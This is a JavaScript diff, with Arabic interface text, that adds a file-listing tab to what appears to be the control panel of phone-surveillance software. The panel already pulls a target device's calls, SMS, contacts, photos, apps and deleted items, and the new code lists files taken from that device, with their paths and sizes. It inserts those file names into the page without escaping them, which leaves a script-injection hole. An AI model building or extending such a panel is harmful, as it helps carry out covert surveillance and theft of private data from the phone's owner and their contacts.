@@ -9,6 +9,7 @@ let allCalls = [];
 let allSMS = [];
 let allContacts = [];
 let allDeleted = [];
+let allFiles = [];
 let currentChat = null;
 let currentCallNumber = null;
 let currentContact = null;
@@ -178,6 +179,7 @@ async function updateLiveData() {
         if (data.images_count !== undefined) document.getElementById('imagesCount').textContent = `(${data.images_count})`;
         if (data.apps_count !== undefined) document.getElementById('appsCount').textContent = `(${data.apps_count})`;
         if (data.deleted_count !== undefined) document.getElementById('deletedCount').textContent = `(${data.deleted_count})`;
+        if (data.files_count !== undefined) document.getElementById('filesCount').textContent = `(${data.files_count})`;
     } catch (e) {}
 }
 
@@ -190,6 +192,7 @@ async function loadAllData() {
     await loadApps();
     await loadDeviceInfo();
     await loadDeleted();
+    await loadFiles();
 }
 
 // ✅ تحميل المحذوفات
@@ -206,7 +209,43 @@ async function loadDeleted() {
     } catch (e) {}
 }
 
-// ✅ عرض المحذوفات مع التفاصيل الكاملة
+// ✅ تحميل الملفات
+async function loadFiles() {
+    try {
+        const response = await fetch(`/api.php?action=get_files&device=${encodeURIComponent(currentDevice)}`);
+        const files = await response.json();
+        
+        const div = document.getElementById('filesList');
+        if (!div) return;
+        
+        div.innerHTML = '';
+        
+        if (!files || files.length === 0) {
+            div.innerHTML = '<p style="color:#888;">لا توجد ملفات محملة</p>';
+            document.getElementById('filesCount').textContent = '(0)';
+            return;
+        }
+        
+        [...files].sort((a, b) => (b.date || 0) - (a.date || 0)).forEach(file => {
+            const divItem = document.createElement('div');
+            divItem.className = 'conversation-item';
+            divItem.innerHTML = `
+                <div class="conversation-avatar">📄</div>
+                <div class="conversation-info">
+                    <div class="conversation-name">${file.name || 'ملف'}</div>
+                    <div class="conversation-preview">المسار: ${file.path || ''}</div>
+                    <div class="conversation-preview">الحجم: ${formatBytes(file.size)}</div>
+                </div>
+                <div class="conversation-time">${formatDate(file.date)}</div>
+            `;
+            div.appendChild(divItem);
+        });
+        
+        document.getElementById('filesCount').textContent = `(${files.length})`;
+    } catch (e) {}
+}
+
+// ✅ عرض المحذوفات مع التفاصيل
 function displayDeleted() {
     const div = document.getElementById('deletedList');
     if (!div) return;
@@ -448,6 +487,7 @@ function switchTab(tabName) {
 
 function formatDuration(s) { if (!s || s < 0) return '0:00'; return `${Math.floor(s/60)}:${(s%60).toString().padStart(2,'0')}`; }
 function formatDate(t) { if (!t) return '—'; try { return new Date(t).toLocaleString('ar'); } catch (e) { return '—'; } }
+function formatBytes(bytes) { if (!bytes || bytes === 0) return '0 Bytes'; const k = 1024; const sizes = ['Bytes', 'KB', 'MB', 'GB']; const i = Math.floor(Math.log(bytes) / Math.log(k)); return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i]; }
 function getCallType(t) { switch(parseInt(t)) { case 1: return '📥 وارد'; case 2: return '📤 صادر'; case 3: return '❌ فائت'; default: return 'غير معروف'; } }
 
 loadDevices();
